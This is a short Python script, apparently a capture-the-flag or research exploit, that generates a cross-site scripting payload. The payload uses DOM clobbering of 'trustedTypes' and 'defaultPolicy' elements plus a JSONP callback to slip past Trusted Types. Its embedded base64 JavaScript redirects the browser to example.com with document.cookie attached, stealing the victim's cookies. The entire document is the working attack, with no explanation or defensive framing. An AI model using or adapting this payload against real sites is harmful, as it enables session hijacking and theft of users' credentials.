import base64
code = b'location="http://example.com?"+encodeURIComponent(document.cookie)'
template = '"><form id="trustedTypes"><input name="defaultPolicy"></form><a href="abc:jsonp(x);//" id="callback"></a><a href="data:text/plain;base64,{}" id="x"></a>'
print(template.format(base64.b64encode(code).decode()))